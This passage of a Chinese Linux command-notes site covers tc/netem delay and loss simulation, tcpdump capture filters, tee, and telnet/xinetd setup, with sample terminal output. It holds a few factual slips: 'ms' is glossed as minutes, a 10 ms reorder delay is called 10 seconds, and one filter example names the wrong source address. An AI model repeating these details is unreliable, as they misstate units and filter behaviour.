Detection（随机早期探测）的简写。如果使用这种qdsic，当带宽的占用接近与规定的带宽时，系统会随机的丢弃一些数据包。他非常适合高带宽的应用。 sfq，sfq是Stochastic Fairness Queueing 的简写。它会按照会话（session --对应与每个TCP 连接或者UDP流）为流量进行排序，然后循环发送每个会话的数据包。 tbf，tbf是 Token Bucket Filter 的简写，适用于把流速降低到某个值。 CLASSLESS QDISC （无类别QDISC）的配置 如果没有可分类qdisc，不可分类qdisc 只能附属于设备的根。它们的用法如 $ tc qdisc add dev DEV root QDISC QDISC_PARAMETERS 要删除一个不可分类qdisc，需要使用如 $ tc qdisc del dev DEV root 一个网络接口上如果没有设置qdisc，pfifo_fast就作为缺省的qdisc。 CLASSFUL QDISC(可分类 QDISC)包括： CBQ，CBQ是 Class Based Queueing（基于类别排队）的缩写。它实现了一个丰富的连接共享类别结构，既有限制（shaping）带宽的能力，也具有带宽优先级别管理的能力。带宽限制是通过计算连接的空闲时间完成的。空闲时间的计算标准是数据包离队事件的频率和下层连接（数据链路层）的带宽。 HTB，HTB是Hierarchy Token Bucket 的缩写。通过在实践基础上的改进，它实现一个丰富的连接共享类别体系。使用HTB可以很容易地保证每个类别的带宽，虽然它也允许特定的类可以突破带宽上限，占用别的类的带宽。HTB可以通过TBF（Token Bucket Filter）实现带宽限制，也能够划分类别的优先级。 PRIO，PRIO qdisc 不能限制带宽，因为属于不同类别的数据包是顺序离队的。使用PRIO qdisc 可以很容易对流量进行优先级管理，只有属于高优先级类别的数据包全部发送完毕，参会发送属于低优先级类别的数据包。为了方便管理，需要使用iptables 或者 ipchains 处理数据包的服务类型（Type Of Service，TOS）。 3. 操作原理 类（class）组成一个树，每个类都只有一个父类，而一个类可以有多个子类。某些qdisc （例如：CBQ和 HTB）允许在运行时动态添加类，而其它的qdisc（例如：PRIO）不允许动态建立类。允许动态添加类的qdisc可以有零个或者多个子类，由它们为数据包排队。此外，每个类都有一个叶子qdisc，默认情况下，这个也在qdisc有可分类，不过每个子类只能有一个叶子qdisc。 当一个数据包进入一个分类qdisc，它会被归入某个子类。我们可以使用一下三种方式为数据包归类，不过不是所有的qdisc都能够使用这三种方式。 如果过滤器附属于一个类，相关的指令就会对它们进行查询。过滤器能够匹配数据包头所有的域，也可以匹配由ipchains或者iptables做的标记。 树的每个节点都可以有自己的过滤器，但是高层的过滤器也可以一直接用于其子类。如果数据包没有被成功归类，就会被排到这个类的叶子qdisc的队中。相关细节在各个qdisc的手册页中。 4. 命名规则 所有的qdisc、类、和过滤器都有ID。ID可以手工设置，也可以由内核自动分配。ID由一个主序列号和一个从序列号组成，两个数字用一个冒号分开。 qdisc，一个qdisc会被分配一个主序列号，叫做句柄（handle），然后把从序列号作为类的命名空间。句柄才有像1:0 一样的表达方式。习惯上，需要为有子类的qdisc显式的分配一个句柄。 类（Class），在同一个qdisc里面的类共享这个qdisc的主序列号，但是每个类都有自己的从序列号，叫做类识别符（classid）。类识别符只与父qdisc有关，与父类无关。类的命名习惯和qdisc相同。 过滤器（Filter），过滤器的ID有三部分，只有在对过滤器进行散列组织才会用到。详情请参考tc-filtes手册页。 5. 单位 tc命令所有的参数都可以使用浮点数，可能会涉及到以下计数单位。 带宽或者流速单位： kbps 千字节/秒 mbps 兆字节/秒 kbit KBits/秒 mbit MBits/秒 bps或者一个无单位数字 字节数/秒 数据的数量单位： kb或者k 千字节 mb或者m 兆字节 mbit 兆bit kbit 千bit b或者一个无单位数字 字节数 时间的计量单位： s、sec或者secs 秒 ms、msec或者msecs 分钟 us、usec、usecs或者一个无单位数字 微秒 6. 安装 TC是linux自带的模块，一般不需要安装，TC要求内核2.4.18以上。注意：64位机器上，或需先执行下面命令，做个软链接：ln -s /usr/lib64/tc /usr/lib/tc 7. 命令 tc可以使用以下命令对qdisc、类和过滤器进行操作： add， 在一个节点里加入一个qdisc、类、或者过滤器。添加时，需要传递一个祖先作为参数，传递参数时既可以使用ID也跨越式直接传递设备的根。如果要建立一个qdisc或者过滤器，可以使用句柄（handle）来命名。如果要建立一个类，可以使用类识别符（classid）来命名。 remove， 删除由某个句柄（handle）指定的qdisc，根qdisc（root）也可以删除。被删除qdisc上所有的子类以及附属于各个类的过滤器都会被自动删除。 change， 以替代的方式修改某些条目。除了句柄（handle）和祖先不能修改以外，change命令的语法和add命令相同。换句话说，change命令不能指定节点的位置。 replace， 对一个现有节点进行近于原子操作的删除/添加。如果节点不存在，这个命令就会建立节点。 link， 只适用于qdisc，替代一个现有的节点。 名称： linux TC(8) ： tc - 显示/操作流量控制设置 命令的格式： tc qdisc [ add | change | replace | link | delete ] dev DEV [ parent qdisc-id | root ] [ handle qdisc-id ] qdisc [ qdisc specific parameters ] tc class [ add | change | replace | delete ] dev DEV parent qdisc-id [ classid class-id ] qdisc [ qdisc specific parameters ] tc filter [ add | change | replace | delete ] dev DEV [ parent qdisc-id | root ] protocol protocol prio priority filtertype [ filtertype specific parameters ] flowid flow-id tc [ FORMAT ] qdisc show [ dev DEV ] tc [ FORMAT ] class show dev DEV tc filter show dev DEV tc [ -force ] [ -OK ] -b[atch] [ filename ] FORMAT := { -s[tatistics] | -d[etails] | -r[aw] | -p[retty] | -i[ec] } 8. 常用命令 模拟延迟传输： $ tc qdisc add dev eth0 root netem delay 100ms 该命令将 eth0 网卡的传输设置为延迟 100 毫秒发送，更真实的情况下,延迟值不会这么精确，会有一定的波动，后面用下面的情况来模拟出带有波动性的延迟值 模拟延迟波动： $ tc qdisc add dev eth0 root netem delay 100ms 10ms 该命令将 eth0 网卡的传输设置为延迟 100ms ± 10ms (90 ~ 110 ms 之间的任意值)发送。 还可以更进一步加强这种波动的随机性 延迟波动随机性： 该命令将 eth0 网卡的传输设置为 100ms ,同时,大约有 30% 的包会延迟 ± 10ms 发送。 $ tc qdisc add dev eth0 root netem delay 100ms 10ms 30% 模拟网络丢包： $ tc qdisc add dev eth0 root netem loss 1% 该命令将 eth0 网卡的传输设置为随机丢掉 1% 的数据包 网络丢包成功率： $ tc qdisc add dev eth0 root netem loss 1% 30% 该命令将 eth0 网卡的传输设置为随机丢掉 1% 的数据包,成功率为 30% 删除相关配置（将之前命令中的 add 改为 del 即可删除配置）： $ tc qdisc del dev eth0 root netem delay 100ms 模拟包重复： $ tc qdisc add dev eth0 root netem duplicate 1% 该命令将 eth0 网卡的传输设置为随机产生 1% 的重复数据包 模拟包损坏： $ tc qdisc add dev eth0 root netem corrupt 0.2% 该命令将 eth0 网卡的传输设置为随机产生 0.2% 的损坏的数据包 。 (内核版本需在 2.6.16 以上) 模拟包乱序： $ tc qdisc change dev eth0 root netem delay 10ms reorder 25% 50% 该命令将 eth0 网卡的传输设置为:有 25% 的数据包(50%相关)会被立即发送,其他的延迟10 秒。 新版本中,如下命令也会在一定程度上打乱发包的次序:# tc qdisc add dev eth0 root netem delay 100ms 10ms 查看网卡配置： $ tc qdisc show dev eth0 该命令将 查看并显示 eth0 网卡的相关传输配置 查看丢包率： $ tc -s qdisc show dev eth0 9. 案例 如何使用tc模拟网络延迟和丢包 修改网络延时： sudo tc qdisc add dev eth0 root netem delay 1000ms 查看流量管理：tc qdisc show 删除策略：sudo tc qdisc del dev eth0 root netem delay 1000ms 验证效果：ping 192.168.102.124 -c 20 修改丢包率：sudo tc qdisc add dev eth0 root netem loss 10% 删除策略：sudo tc qdisc del dev eth0 root netem loss 10% 配置网络超时 [root@dev-xx-xx ~]# tc qdisc del dev eth0 root netem delay 100ms RTNETLINK answers: Invalid argument [root@dev-xx-xx ~]# tc qdisc show qdisc mq 0: dev eth0 root qdisc pfifo_fast 0: dev eth0 parent :1 bands 3 priomap 1 2 2 2 1 2 0 0 1 1 1 1 1 1 1 1 qdisc pfifo_fast 0: dev eth0 parent :2 bands 3 priomap 1 2 2 2 1 2 0 0 1 1 1 1 1 1 1 1 qdisc pfifo_fast 0: dev eth0 parent :3 bands 3 priomap 1 2 2 2 1 2 0 0 1 1 1 1 1 1 1 1 qdisc pfifo_fast 0: dev eth0 parent :4 bands 3 priomap 1 2 2 2 1 2 0 0 1 1 1 1 1 1 1 1 [root@dev-xx-xx ~]# tc qdisc add dev eth0 root netem delay 100ms [root@dev-xx-xx ~]# ping 192.168.102.124 PING 192.168.102.124 (192.168.102.124) 56(84) bytes of data. 64 bytes from 192.168.102.124: icmp_seq=1 ttl=64 time=0.074 ms 64 bytes from 192.168.102.124: icmp_seq=2 ttl=64 time=0.066 ms 64 bytes from 192.168.102.124: icmp_seq=3 ttl=64 time=0.080 ms 64 bytes from 192.168.102.124: icmp_seq=4 ttl=64 time=0.043 ms 64 bytes from 192.168.102.124: icmp_seq=5 ttl=64 time=0.084 ms 64 bytes from 192.168.102.124: icmp_seq=6 ttl=64 time=0.094 ms ^C --- 192.168.102.124 ping statistics --- 12 packets transmitted, 12 received, 0% packet loss, time 11131ms rtt min/avg/max/mdev = 0.043/0.081/0.107/0.018 ms [root@dev-xx-xx ~]# tc qdisc del dev eth0 root netem delay 100ms [root@dev-xx-xx ~]# tc qdisc del dev eth0 root netem delay 100ms RTNETLINK answers: Invalid argument 配置网络丢包率 [root@dev-xx-xx ~]# tc qdisc del dev eth0 root netem loss 10% RTNETLINK answers: Invalid argument [root@dev-xx-xx ~]# tc qdisc add dev eth0 root netem loss 10% [root@dev-xx-xx ~]# tc qdisc show qdisc netem 8005: dev eth0 root refcnt 5 limit 1000 loss 10% [root@dev-xx-xx ~]# ping 192.168.102.124 -n 20 PING 20 (0.0.0.20) 56(124) bytes of data. ^C --- 20 ping statistics --- 21 packets transmitted, 0 received, 100% packet loss, time 20650ms [root@dev-xx-xx ~]# ping 192.168.102.124 -c 20 PING 192.168.102.124 (192.168.102.124) 56(84) bytes of data. 64 bytes from 192.168.102.124: icmp_seq=1 ttl=64 time=0.101 ms 64 bytes from 192.168.102.124: icmp_seq=2 ttl=64 time=0.062 ms 64 bytes from 192.168.102.124: icmp_seq=3 ttl=64 time=0.098 ms 64 bytes from 192.168.102.124: icmp_seq=4 ttl=64 time=0.098 ms 64 bytes from 192.168.102.124: icmp_seq=5 ttl=64 time=0.062 ms 64 bytes from 192.168.102.124: icmp_seq=6 ttl=64 time=0.088 ms 64 bytes from 192.168.102.124: icmp_seq=7 ttl=64 time=0.045 ms 64 bytes from 192.168.102.124: icmp_seq=8 ttl=64 time=0.070 ms 64 bytes from 192.168.102.124: icmp_seq=9 ttl=64 time=0.062 ms 64 bytes from 192.168.102.124: icmp_seq=10 ttl=64 time=0.066 ms 64 bytes from 192.168.102.124: icmp_seq=11 ttl=64 time=0.088 ms 64 bytes from 192.168.102.124: icmp_seq=12 ttl=64 time=0.070 ms 64 bytes from 192.168.102.124: icmp_seq=13 ttl=64 time=0.089 ms 64 bytes from 192.168.102.124: icmp_seq=14 ttl=64 time=0.087 ms 64 bytes from 192.168.102.124: icmp_seq=15 ttl=64 time=0.054 ms 64 bytes from 192.168.102.124: icmp_seq=16 ttl=64 time=0.085 ms 64 bytes from 192.168.102.124: icmp_seq=17 ttl=64 time=0.064 ms 64 bytes from 192.168.102.124: icmp_seq=18 ttl=64 time=0.124 ms 64 bytes from 192.168.102.124: icmp_seq=19 ttl=64 time=0.063 ms 64 bytes from 192.168.102.124: icmp_seq=20 ttl=64 time=0.108 ms --- 192.168.102.124 ping statistics --- 20 packets transmitted, 20 received, 0% packet loss, time 19000ms rtt min/avg/max/mdev = 0.045/0.079/0.124/0.020 ms [root@dev-xx-xx ~]# tc qdisc del dev eth0 root netem loss 10% [root@dev-xx-xx ~]# ping 192.168.102.124 -c 20 PING 192.168.102.124 (192.168.102.124) 56(84) bytes of data. 64 bytes from 192.168.102.124: icmp_seq=1 ttl=64 time=0.041 ms 64 bytes from 192.168.102.124: icmp_seq=2 ttl=64 time=0.132 ms 64 bytes from 192.168.102.124: icmp_seq=3 ttl=64 time=0.344 ms 64 bytes from 192.168.102.124: icmp_seq=4 ttl=64 time=0.404 ms 64 bytes from 192.168.102.124: icmp_seq=5 ttl=64 time=0.086 ms 64 bytes from 192.168.102.124: icmp_seq=6 ttl=64 time=0.088 ms 64 bytes from 192.168.102.124: icmp_seq=7 ttl=64 time=0.063 ms 64 bytes from 192.168.102.124: icmp_seq=8 ttl=64 time=0.109 ms 64 bytes from 192.168.102.124: icmp_seq=9 ttl=64 time=0.064 ms 64 bytes from 192.168.102.124: icmp_seq=10 ttl=64 time=0.092 ms 64 bytes from 192.168.102.124: icmp_seq=11 ttl=64 time=0.044 ms 64 bytes from 192.168.102.124: icmp_seq=12 ttl=64 time=0.066 ms 64 bytes from 192.168.102.124: icmp_seq=13 ttl=64 time=0.094 ms 64 bytes from 192.168.102.124: icmp_seq=14 ttl=64 time=0.097 ms 64 bytes from 192.168.102.124: icmp_seq=15 ttl=64 time=0.108 ms 64 bytes from 192.168.102.124: icmp_seq=16 ttl=64 time=0.043 ms 64 bytes from 192.168.102.124: icmp_seq=17 ttl=64 time=0.093 ms 64 bytes from 192.168.102.124: icmp_seq=18 ttl=64 time=0.056 ms 64 bytes from 192.168.102.124: icmp_seq=19 ttl=64 time=0.093 ms 64 bytes from 192.168.102.124: icmp_seq=20 ttl=64 time=0.039 ms --- 192.168.102.124 ping statistics --- 20 packets transmitted, 20 received, 0% packet loss, time 18999ms rtt min/avg/max/mdev = 0.039/0.107/0.404/0.093 ms [root@dev-xx-xx ~]# 参考： linux下使用tc(Traffic Control) 流量控制命令模拟网络延迟和丢包 Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-11-14 07:55:09 "},"Linux-Command/Linux_Command_tcpdump.html":{"url":"Linux-Command/Linux_Command_tcpdump.html","title":"Linux Command Tcpdump","keywords":"","body":"Linux Command tcpdump 抓包工具1. 简介2. tcpdump选项3. tcpdump表达式4. tcpdump示例4.1 默认启动4.2 监视指定网络接口的数据包4.3 监视指定主机的数据包4.4 打印helioshot或heliosace之间通信的数据包4.5 打印ace与任何其他主机之间通信的IP数据包4.6 截获主机hostname发送的所有数据4.7 监视所有发送到主机hostname的数据包4.8 监视指定主机和端口的数据包4.9. 对本机的udp 123端口进行监视(123为ntp的服务端口)4.10 监视指定网络的数据包4.11 打印所有通过网关snup的ftp数据包4.12 抓取ping包4.13 抓取到本机22端口包4.14 解析包数据Linux Command tcpdump 抓包工具 tagsstart 监控 分析 tagsstop 1. 简介 tcpdump采用命令行方式对接口的数据包进行筛选抓取，其丰富特性表现在灵活的表达式上。 不带任何选项的tcpdump，默认会抓取第一个网络接口，且只有将tcpdump进程终止才会停止抓包。 例如： shell> tcpdump -nn -i eth0 icmp 2. tcpdump选项 它的命令格式为： tcpdump [ -DenNqvX ] [ -c count ] [ -F file ] [ -i interface ] [ -r file ] [ -s snaplen ] [ -w file ] [ expression ] 抓包选项： -c：指定要抓取的包数量。注意，是最终要获取这么多个包。例如，指定\"-c 10\"将获取10个包，但可能已经处理了100个包，只不过只有10个包是满足条件的包。 -i interface：指定tcpdump需要监听的接口。若未指定该选项，将从系统接口列表中搜寻编号最小的已配置好的接口(不包括loopback接口，要抓取loopback接口使用tcpdump -i lo)， ：一旦找到第一个符合条件的接口，搜寻马上结束。可以使用'any'关键字表示所有网络接口。 -n：对地址以数字方式显式，否则显式为主机名，也就是说-n选项不做主机名解析。 -nn：除了-n的作用外，还把端口显示为数值，否则显示端口服务名。 -N：不打印出host的域名部分。例如tcpdump将会打印'nic'而不是'nic.ddn.mil'。 -P：指定要抓取的包是流入还是流出的包。可以给定的值为\"in\"、\"out\"和\"inout\"，默认为\"inout\"。 -s len：设置tcpdump的数据包抓取长度为len，如果不设置默认将会是65535字节。对于要抓取的数据包较大时，长度设置不够可能会产生包截断，若出现包截断， ：输出行中会出现\"[|proto]\"的标志(proto实际会显示为协议名)。但是抓取len越长，包的处理时间越长，并且会减少tcpdump可缓存的数据包的数量， ：从而会导致数据包的丢失，所以在能抓取我们想要的包的前提下，抓取长度越小越好。 输出选项： -e：输出的每行中都将包括数据链路层头部信息，例如源MAC和目标MAC。 -q：快速打印输出。即打印很少的协议相关信息，从而输出行都比较简短。 -X：输出包的头部数据，会以16进制和ASCII两种方式同时输出。 -XX：输出包的头部数据，会以16进制和ASCII两种方式同时输出，更详细。 -v：当分析和打印的时候，产生详细的输出。 -vv：产生比-v更详细的输出。 -vvv：产生比-vv更详细的输出。 其他功能性选项： -D：列出可用于抓包的接口。将会列出接口的数值编号和接口名，它们都可以用于\"-i\"后。 -F：从文件中读取抓包的表达式。若使用该选项，则命令行中给定的其他表达式都将失效。 -w：将抓包数据输出到文件中而不是标准输出。可以同时配合\"-G time\"选项使得输出文件每time秒就自动切换到另一个文件。可通过\"-r\"选项载入这些文件以进行分析和打印。 -r：从给定的数据包文件中读取数据。使用\"-\"表示从标准输入中读取。 所以常用的选项也就这几个： tcpdump -D tcpdump -c num -i int -nn -XX -vvv 3. tcpdump表达式 表达式用于筛选输出哪些类型的数据包，如果没有给定表达式，所有的数据包都将输出，否则只输出表达式为true的包。在表达式中出现的shell元字符建议使用单引号包围。 tcpdump的表达式由一个或多个\"单元\"组成，每个单元一般包含ID的修饰符和一个ID(数字或名称)。有三种修饰符： 所以，一个基本的表达式单元格式为\"proto dir type ID\" 常用的协议有tcp/udp/arp/ip/ether/icmp等，若未给定协议类型，则匹配所有可能的类型。例如\"tcp port 21\"，\"udp portrange 7000-7009\"。 (1).proto：通过给定协议限定匹配的数据包类型。 可以给定的值包括src/dst/src or dst/src and dst，默认为src or dst。例如，\"src foo\"表示源主机为foo的数据包，\"dst net 128.3\"表示目标网络为128.3的数据包，\"src or dst port 22\"表示源或目的端口为22的数据包。 (2).dir：指定ID的方向。 可以给定的值有host/net/port/portrange。例如\"host foo\"，\"net 128.3\"，\"port 20\"，\"portrange 6000-6008\"。默认的type为host。 (3).type：指定ID的类型。 tcpdump的表达式由一个或多个\"单元\"组成，每个单元一般包含ID的修饰符和一个ID(数字或名称)。有三种修饰符： 除了使用修饰符和ID组成的表达式单元，还有关键字表达式单元：gateway，broadcast，less，greater以及算术表达式。 表达式单元之间可以使用操作符\" and / && / or / || / not / ! \"进行连接，从而组成复杂的条件表达式。如\"host foo and not port ftp and not port ftp-data\"，这表示筛选的数据包要满足\"主机为foo且端口不是ftp(端口21)和ftp-data(端口20)的包\"，常用端口和名字的对应关系可在linux系统中的/etc/service文件中找到。 另外，同样的修饰符可省略，如\"tcp dst port ftp or ftp-data or domain\"与\"tcp dst port ftp or tcp dst port ftp-data or tcp dst port domain\"意义相同，都表示包的协议为tcp且目的端口为ftp或ftp-data或domain(端口53)。 使用括号\"()\"可以改变表达式的优先级，但需要注意的是括号会被shell解释，所以应该使用反斜线\"\\\"转义为\"()\"，在需要的时候，还需要包围在引号中。 4. tcpdump示例 注意，tcpdump只能抓取流经本机的数据包。 4.1 默认启动 tcpdump 默认情况下，直接启动tcpdump将监视第一个网络接口(非lo口)上所有流通的数据包。这样抓取的结果会非常多，滚动非常快。 4.2 监视指定网络接口的数据包 tcpdump -i eth1 如果不指定网卡，默认tcpdump只会监视第一个网络接口，如eth0。 4.3 监视指定主机的数据包 例如所有进入或离开longshuai的数据包 tcpdump host longshuai 4.4 打印helioshot或heliosace之间通信的数据包 tcpdump host helios and \\( hot or ace \\) 4.5 打印ace与任何其他主机之间通信的IP数据包 但不包括与helios之间的数据包 tcpdump ip host ace and not helios 4.6 截获主机hostname发送的所有数据 tcpdump src host hostname 4.7 监视所有发送到主机hostname的数据包 tcpdump dst host hostname 4.8 监视指定主机和端口的数据包 tcpdump tcp port 22 and host hostname 4.9. 对本机的udp 123端口进行监视(123为ntp的服务端口) tcpdump udp port 123 4.10 监视指定网络的数据包 如本机与192.168网段通信的数据包，\"-c 10\"表示只抓取10个包 tcpdump -c 10 net 192.168 4.11 打印所有通过网关snup的ftp数据包 (注意,表达式被单引号括起来了,这可以防止shell对其中的括号进行错误解析) shell> tcpdump 'gateway snup and (port ftp or ftp-data)' 4.12 抓取ping包 [root@server2 ~]# tcpdump -c 5 -nn -i eth0 icmp tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 12:11:23.273638 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16422, seq 10, length 64 12:11:23.273666 IP 192.168.100.62 > 192.168.100.70: ICMP echo reply, id 16422, seq 10, length 64 12:11:24.356915 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16422, seq 11, length 64 12:11:24.356936 IP 192.168.100.62 > 192.168.100.70: ICMP echo reply, id 16422, seq 11, length 64 12:11:25.440887 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16422, seq 12, length 64 packets captured packets received by filter packets dropped by kernel 如果明确要抓取主机为192.168.100.70对本机的ping，则使用and操作符。 [root@server2 ~]# tcpdump -c 5 -nn -i eth0 icmp and src 192.168.100.62 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 12:09:29.957132 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16166, seq 1, length 64 12:09:31.041035 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16166, seq 2, length 64 12:09:32.124562 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16166, seq 3, length 64 12:09:33.208514 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16166, seq 4, length 64 12:09:34.292222 IP 192.168.100.70 > 192.168.100.62: ICMP echo request, id 16166, seq 5, length 64 packets captured packets received by filter packets dropped by kernel 注意不能直接写icmp src 192.168.100.70，因为icmp协议不支持直接应用host这个type。 4.13 抓取到本机22端口包 [root@server2 ~]# tcpdump -c 10 -nn -i eth0 tcp dst port 22 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 12:06:57.574293 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 535528834, win 2053, length 0 12:06:57.629125 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 193, win 2052, length 0 12:06:57.684688 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 385, win 2051, length 0 12:06:57.738977 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 577, win 2050, length 0 12:06:57.794305 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 769, win 2050, length 0 12:06:57.848720 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 961, win 2049, length 0 12:06:57.904057 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 1153, win 2048, length 0 12:06:57.958477 IP 192.168.100.1.5788 > 192.168.100.62.22: Flags [.], ack 1345, win 2047, length 0 4.14 解析包数据 [root@server2 ~]# tcpdump -c 2 -q -XX -vvv -nn -i eth0 tcp dst port 22 tcpdump: listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes 12:15:54.788812 IP (tos 0x0, ttl 64, id 19303, offset 0, flags [DF], proto TCP (6), length 40) 192.168.100.1.5788 > 192.168.100.62.22: tcp 0 0x0000: 000c 2908 9234 0050 56c0 0008 0800 4500 ..)..4.PV.....E. 0x0010: 0028 4b67 4000 4006 a5d8 c0a8 6401 c0a8 .(Kg@.@.....d... 0x0020: 643e 169c 0016 2426 5fd6 1fec 2b62 5010 d>....$&_...+bP. 0x0030: 0803 7844 0000 0000 0000 0000 ..xD........ 12:15:54.842641 IP (tos 0x0, ttl 64, id 19304, offset 0, flags [DF], proto TCP (6), length 40) 192.168.100.1.5788 > 192.168.100.62.22: tcp 0 0x0000: 000c 2908 9234 0050 56c0 0008 0800 4500 ..)..4.PV.....E. 0x0010: 0028 4b68 4000 4006 a5d7 c0a8 6401 c0a8 .(Kh@.@.....d... 0x0020: 643e 169c 0016 2426 5fd6 1fec 2d62 5010 d>....$&_...-bP. 0x0030: 0801 7646 0000 0000 0000 0000 ..vF........ packets captured packets received by filter packets dropped by kernel 总的来说，tcpdump对基本的数据包抓取方法还是较简单的。只要掌握有限的几个选项(-nn -XX -vvv -i -c -q)，再组合表达式即可。 参考： An introduction to using tcpdump at the Linux command line 12 Tcpdump Commands – A Network Sniffer Tool Tcpdump Command in Linux Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-23 17:04:57 "},"Linux-Command/Linux_Command_tee.html":{"url":"Linux-Command/Linux_Command_tee.html","title":"Linux Command Tee","keywords":"","body":"Linux Command tee1. 简介2. 参数3. 实例Linux Command tee tagsstart 文件管理 tagsstop 1. 简介 Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。 tee指令会从标准输入设备读取数据，将其内容输出到标准输出设备，同时保存成文件。 图 1.2.79.1：在这里插入图片描述 2. 参数 -a或--append 　附加到既有文件的后面，而非覆盖它． -i或--ignore-interrupts 　忽略中断信号。 --help 　在线帮助。 --version 　显示版本信息。 3. 实例 # 将进程信息通过管道输出到标准输出（终端）并覆盖写入到文件中。 ps -ef |tee info_a.log info_b.log # 将进程信息通过管道输出到标准输出（终端）并追加写入到文件中。 ps -ef |tee -a info_a.log info_b.log Copyright © ghostwritten 浙ICP备2020032454号 2022 all right reserved，powered by Gitbook该文件修订时间： 2022-06-14 05:49:03 "},"Linux-Command/Linux_Command_telnet.html":{"url":"Linux-Command/Linux_Command_telnet.html","title":"Linux Command Telnet","keywords":"","body":"Linux Command telnet1. 简介2. 安装3. 语法4. 选项5. 参数6. 启动telnet服务Linux Command telnet tagsstart 网络 tagsstop 1. 简介 telnet命令 用于登录远程主机，对远程主机进行管理。telnet因为采用明文传送报文，安全性不好，很多Linux服务器都不开放telnet服务，而改用更安全的ssh方式了。但仍然有很多别的系统可能采用了telnet方式来提供远程登录，因此弄清楚telnet客户端的使用方式仍是很有必要的 2. 安装 $ yum install xinetd.x86_64 telnet.x86_64 3. 语法 telnet(选项)(参数) 4. 选项 -8：允许使用8位字符资料，包括输入与输出； -a：尝试自动登入远端系统； -b：使用别名指定远端主机名称； -c：不读取用户专属目录里的.telnetrc文件； -d：启动排错模式； -e：设置脱离字符； -E：滤除脱离字符； -f：此参数的效果和指定\"-F\"参数相同； -F：使用Kerberos V5认证时，加上此参数可把本地主机的认证数据上传到远端主机； -k：使用Kerberos认证时，加上此参数让远端主机采用指定的领域名，而非该主机的域名； -K：不自动登入远端主机； -l：指定要登入远端主机的用户名称； -L：允许输出8位字符资料； -n：指定文件记录相关信息； -r：使用类似rlogin指令的用户界面； -S：设置telnet连线所需的ip TOS信息； -x：假设主机有支持数据加密的功能，就使用它； -X：关闭指定的认证形态。 5. 参数 远程主机：指定要登录进行管理的远程主机； 端口：指定TELNET协议使用的端口号。 处理这种情况方法： 确认ip地址是否正确？ 确认ip地址对应的主机是否已经开机？ 如果主机已经启动，确认路由设置是否设置正确？（使用route命令查看） 如果主机已经启动，确认主机上是否开启了telnet服务？（使用netstat命令查看，TCP的23端口是否有LISTEN状态的行） 如果主机已经启动telnet服务，确认防火墙是否放开了23端口的访问？（使用iptables-save查看） 6. 启动telnet服务 service xinetd restart 配置参数，通常的配置如下： $ cd /etc/xinetd.d/ $ ll 总计 124 -rw-r--r-- 1 root root 1157 2011-05-31 chargen-dgram -rw-r--r-- 1 root root 1159 2011-05-31 chargen-stream -rw-r--r-- 1 root root 523 2009-09-04 cvs -rw-r--r-- 1 root root 1157 2011-05-31 daytime-dgram -rw-r--r-- 1 root root 1159 2011-05-31 daytime-stream -rw-r--r-- 1 root root 1157 2011-05-31 discard-dgram -rw-r--r-- 1 root root 1159 2011-05-31 discard-stream -rw-r--r-- 1 root root 1148 2011-05-31 echo-dgram -rw-r--r-- 1 root root 1150 2011-05-31 echo-stream -rw-r--r-- 1 root root 323 2004-09-09 eklogin -rw-r--r-- 1 root root 347 2005-09-06 ekrb5-telnet -rw-r--r-- 1 root root 326 2004-09-09 gssftp -rw-r--r-- 1 root root 310 2004-09-09 klogin -rw-r--r-- 1 root root 323 2004-09-09 krb5-telnet -rw-r--r-- 1 root root 308 2004-09-09 kshell -rw-r--r-- 1 root root 317 2004-09-09 rsync -rw-r--r-- 1 root root 1212 2011-05-31 tcpmux-server -rw-r--r-- 1 root root 1149 2011-05-31 time-dgram -rw-r--r-- 1 root root 1150 2011-05-31 time-stream $ cat krb5-telnet # default: off # description: The kerberized telnet server accepts normal telnet sessions, \\ # but can also use Kerberos 5 authentication. service telnet { flags = REUSE socket_type = stream wait = no user = root server = /usr/kerberos/sbin/telnetd log_on_failure += USERID disable = yes } 说明： 配置参数，通常的配置如下： service telnet { disable = no #启用 flags = REUSE #socket可重用 socket_type = stream #连接方式为TCP wait = no #为每个请求启动一个进程 user = root #启动服务的用户为root server = /usr/sbin/in.telnetd #要激活的进程 log_on_failure += USERID #登录失败时记录登录用户名 } 如果要配置允许登录的客户端列表，加入 only_from = 192.168.0.2 #只允许192.168.0.2登录 如果要配置禁止登录的客户端列表，加入 no_access = 192.168.0.{2,3,4} #禁止192.168.0.2、192.168.0.3、192.168.0.4登录 如果要设置开放时段，加入 access_times = 9:00-12:00 13:00-17:00 # 每天只有这两个时段开放服务（我们的上班时间：P） 如果你有两个IP地址，一个是私网的IP地址如192.168.0.2，一个是公网的IP地址如218.75.74.83，如果你希望用户只能从私网来登录telnet服务，那么加入 bind = 192.168.0.2 各配置项具体的含义和语法可参考xined配置文件属性说明（man xinetd.conf） 配置端口，修改services文件： # vi /etc/services 找到以下两句 telnet 23/tcp telnet 23/udp 